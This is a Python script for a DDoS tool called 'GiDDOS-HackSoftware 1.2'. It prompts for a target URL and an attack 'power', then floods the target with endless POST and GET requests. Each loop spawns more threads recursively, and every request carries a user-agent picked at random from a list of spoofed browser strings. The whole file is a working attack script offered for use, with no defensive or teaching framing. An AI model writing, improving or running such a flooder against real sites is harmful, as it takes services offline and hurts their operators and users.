import requests
import threading
import time
import sys
import random
from colorama import init
from colorama import Fore, Back, Style
from threading import Thread
init()

print ( Fore.GREEN + "Product version 1.2 ")
print ( Fore.YELLOW + "■□■□■" + Fore.GREEN + " GiDDOS-HackSoftware 1.2 ║ BY TUSSA AND ALEXAGEN " + Fore.YELLOW + "■□■□■" + Fore.GREEN )
print()
print ( "    _____ _ _____  _____   ____   _____  " + Fore.RED + "V.1.2" + Fore.GREEN )   
print ( "   / ____(_)  __ \|  __ \ / __ \ / ____| " ) 
print ( "  | |  __ _| |  | | |  | | |  | | (___   " ) 
print ( "  | | |_ | | |  | | |  | | |  | |\___ \  " )
print ( "  | |__| | | |__| | |__| | |__| |____) | " )
print ( "   \_____|_|_____/|_____/ \____/|_____/  " )
print ()
print ()
url = None
thrnom = None
url = input( "Url ( example: https:\\\example.com ) ► " )
try:
    requests.get(url)
except requests.exceptions.InvalidURL:
    print( Fore.RED + "ERROR: URL " + "'" + str(url) + "'" + " not exist!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    sys.exit()


except requests.exceptions.MissingSchema:
    print( Fore.RED + "ERROR: URL " + "'" + str(url) + "'" + " not exist!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    sys.exit()


except requests.exceptions.ConnectionError:
    print( Fore.RED + "ERROR: URL " + "'" + str(url) + "'" + " not exist!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    sys.exit()


if not url.__contains__("http"):
    print( Fore.RED + "ERROR: Invalid domain" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    sys.exit()


elif not url.__contains__("."):
    print( Fore.RED + "ERROR: Invalid domain" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    sys.exit()


thrnom = input( "DDOS Atack Power ( example: 1000 ) ► " )
if thrnom == "0":
    print( Fore.RED + "ERROR: Power count is incorrect!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    sys.exit()


elif thrnom == "":
    print( Fore.RED + "ERROR: Power count is incorrect!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    sys.exit()

print ( Fore.YELLOW + "[" + Fore.RED + "●" + Fore.YELLOW + "]" + Fore.GREEN + " YES")
print ( Fore.YELLOW + "[" + Fore.RED + "●" + Fore.YELLOW + "]" + Fore.GREEN + " NO")
ask_for_start = input( "Start DDoS Atack? ► " )

def ddos():
	user_agent = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
              'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
              'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
              'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
              'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
              'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
              'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
              'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
              'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
              'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
              'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0',
              'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.1 Safari/535.1',
			  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
			  'Mozilla/5.0 (X11; Linux amd64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35',
			  'Mozilla/5.0 (X11; CrOS i686 0.13.507) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/13.0.763.0 Safari/534.35',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.33 (KHTML, like Gecko) Ubuntu/9.10 Chromium/13.0.752.0 Chrome/13.0.752.0 Safari/534.33',
			  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/13.0.748.0 Safari/534.31',
			  'Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30',
			  'Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
			  'Mozilla/5.0 (X11; CrOS i686 12.0.742.91) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
			  'Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko)',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5',
               ]
	headers = { "User-Agent": random.choice(user_agent) }
	while(1<10):
		try:
			spam = requests.post(url=url, headers=headers)
			spam2 = requests.get(url=url, headers=headers)
			for i in range(int(thrnom)):
				thr = Thread(target = ddos)
				thr.start()
				url_check_status = requests.get(url=url, headers=headers)
				print("DDOS Atack is running! URL status code: " + str(url_check_status))
		except:
			continue


if ask_for_start == "NO":
	print( Fore.RED + "INFO: DDoS attack was canceled!" + Fore.GREEN )
	print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
	time.sleep(1)
	sys.exit()
elif ask_for_start == "YES":
	ddos()
elif ask_for_start == "no":
	print( Fore.RED + "INFO: DDoS attack was canceled!" + Fore.GREEN )
	print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
	time.sleep(1)
	sys.exit()
elif ask_for_start == "yes":
	ddos()

else:
	print( Fore.RED + "ERROR: Invalid answer!" + Fore.GREEN )
	print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
	time.sleep(1)
	print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
	time.sleep(1)
	sys.exit()


